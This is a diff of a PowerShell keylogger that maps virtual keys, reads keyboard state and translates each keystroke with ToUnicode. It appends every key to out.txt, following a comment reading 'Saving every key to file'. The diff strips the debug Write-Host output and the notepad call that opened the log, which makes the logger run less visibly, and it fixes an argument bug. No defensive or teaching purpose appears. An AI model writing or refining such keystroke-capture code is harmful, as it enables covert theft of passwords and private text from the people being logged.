@@ -38,21 +38,15 @@ try{
                 #Get virtual key (also differentiate between right and left)
                 #The number 3 - The uCode parameter is a scan code and is translated into a virtual-key code that distinguishes between left- and right-hand keys.
                 $vk = [PsOneApi.MapVkey]::MapVirtualKey($key_num,3)
-                Write-Host $vk
                 #Get key states to check for multipress
                 $kb = New-Object Byte[] 256
                 $kbs = [PsOneApi.GetKBS]::GetKeyboardState($kb)
                 #Translate to unicode - Uses keynum vk and kbs to save the unicode to t_char (translated char) (0 is flags for menu)
                 #Buffer for growing string
                 $t_char = New-Object -TypeName System.Text.StringBuilder
-                Write-Host $key_num $vk $kbs $t_char
                 $uni_test = [PsOneApi.ToUni]::ToUnicode(81,34,1,$t_char,$t_char.Capacity,0)
-                Write-Host $uni_operation $t_char
-                $uni_operation = [PsOneApi.ToUni]::ToUnicode($key_num,$vk,$kbs,$t_char,$t_char.Capacity,0)
-                Write-Host $uni_operation
+                $uni_operation = [PsOneApi.ToUni]::ToUnicode($key_num,$vk,$kb,$t_char,$t_char.Capacity,0)
                 if ($uni_operation){
-                    Write-Host $t_char
-                    #$asc = [char]$key_num
                     #Saving every key to file
                     Add-Content -Path '.\out.txt' -Value $t_char -NoNewLine
                 }
@@ -61,5 +55,4 @@ try{
     }
 }
 finally{
-    notepad ".\out.txt"
 }
